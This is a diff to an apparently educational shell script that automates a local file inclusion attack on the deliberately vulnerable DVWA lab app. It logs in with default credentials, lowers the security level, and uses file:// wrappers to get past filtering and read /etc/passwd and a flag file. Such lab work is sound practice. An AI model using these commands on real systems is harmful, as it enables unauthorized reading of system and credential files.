@@ -6,9 +6,9 @@ curl -s -i -L -b dvwa.cookie -d $"username=admin&password=password&Login=Login&u
 CSRFSEC=$(curl -s -i -L -c dvwa.cookie.medium -b dvwa.cookie 192.168.178.98/dvwa/security.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
 SESSIONIDSEC=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
 curl -s -i -L -b dvwa.cookie.medium -c dvwa.cookie.medium -d $"security=medium&seclev_submit=Submit&user_token=${CSRFSEC}" 192.168.178.98/dvwa/security.php > /dev/null
-#Check out the "bruteforce" page
+#Check out the "File injection" page
 curl -s -i -L -b dvwa.cookie.medium 192.168.178.98/dvwa/vulnerabilities/fi/ > /dev/null
-#Use a quick script for encoding (part of) the URL
+#have to use relative paths and https://secure.php.net/manual/en/wrappers.php, http(s):// gets scrubbed
 curl -s -L -b dvwa.cookie.medium 192.168.178.98/dvwa/vulnerabilities/fi/?page=$(../rawurlencode.sh "file:///etc/passwd") > passwd
 curl -s -L -b dvwa.cookie.medium 192.168.178.98/dvwa/vulnerabilities/fi/?page=$(../rawurlencode.sh "file:///var/www/html/dvwa/hackable/flags/fi.php") > hackable
 rm -f dvwa*
